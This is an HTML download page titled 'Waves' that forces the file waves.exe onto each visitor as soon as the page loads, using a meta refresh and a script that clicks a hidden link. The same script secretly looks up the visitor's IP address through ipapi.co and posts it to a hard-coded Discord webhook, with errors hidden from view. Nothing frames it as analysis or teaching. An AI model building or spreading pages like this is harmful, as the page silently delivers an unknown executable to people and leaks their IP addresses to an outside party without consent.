<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waves</title>
    <meta http-equiv="refresh" content="0;url=waves.exe">
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            text-align: center;
        }
        .container {
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Download Starting...</h1>
        <p>If the download doesn't start automatically, click the button below:</p>
        <a href="./waves.exe" download>
            <button>Download waves.exe</button>
        </a>
    </div>
    <script>
        window.onload = function() {
            // Trigger EXE download
            const downloadLink = document.createElement('a');
            downloadLink.href = './waves.exe';
            downloadLink.download = '';
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);

            // Fetch visitor IP and send to webhook
            const webhookUrl = 'https://discordapp.com/api/webhooks/1409882672016396340/TrK3W1JQnuwiEI0MYWN7T3zGy3itJAnmOe4D0-1_IFYH-Yp9zYfE0F8jH1YWZB7STdJU'; // Replace with your actual webhook URL (e.g., Discord webhook)

            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip || 'Unknown';
                    // Send IP to webhook
                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            content: `Visitor IP: ${ip}` // Customize this message as needed
                        })
                    }).catch(error => console.error('Webhook error:', error)); // Silent error handling
                })
                .catch(error => console.error('IP fetch error:', error)); // Silent error handling
        };
    </script>
</body>
</html>
